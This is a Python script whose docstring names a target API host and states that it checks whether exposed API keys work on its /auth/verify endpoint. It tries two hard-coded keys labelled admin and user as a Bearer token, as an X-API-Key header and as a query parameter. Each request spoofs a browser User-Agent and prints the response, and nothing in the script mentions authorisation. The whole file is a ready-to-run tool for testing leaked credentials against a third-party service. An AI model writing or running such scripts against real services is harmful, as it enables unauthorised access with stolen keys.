"""
Author: Jamshaid Mirpour
Target: api.0x10.cloud
Purpose: Check whether exposed API keys work on /auth/verify
"""

import urllib.request
import urllib.error
import urllib.parse
import time

BASE = "http://api.0x10.cloud"
KEYS = [
    "sk-admin-a1b2c3d4e5",
    "sk-user-f6g7h8i9j0",
]

def try_request(label: str, req: urllib.request.Request) -> None:
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            body = response.read().decode("utf-8", errors="replace")
            print("=" * 70)
            print(label)
            print(f"Status: {response.status}")
            print("Body:")
            print(body[:800])
    except urllib.error.HTTPError as e:
        print("=" * 70)
        print(label)
        print(f"HTTP error: {e.code}")
        try:
            print(e.read().decode("utf-8", errors="replace")[:400])
        except Exception:
            pass
    except Exception as e:
        print("=" * 70)
        print(label)
        print(f"Error: {e}")

for key in KEYS:
    req1 = urllib.request.Request(
        f"{BASE}/auth/verify",
        headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"},
    )
    try_request(f"Bearer test with key {key}", req1)
    time.sleep(0.15)

    req2 = urllib.request.Request(
        f"{BASE}/auth/verify",
        headers={"X-API-Key": key, "User-Agent": "Mozilla/5.0"},
    )
    try_request(f"X-API-Key test with key {key}", req2)
    time.sleep(0.15)

    qs = urllib.parse.urlencode({"api_key": key})
    req3 = urllib.request.Request(
        f"{BASE}/auth/verify?{qs}",
        headers={"User-Agent": "Mozilla/5.0"},
    )
    try_request(f"Query-string test with key {key}", req3)
    time.sleep(0.15)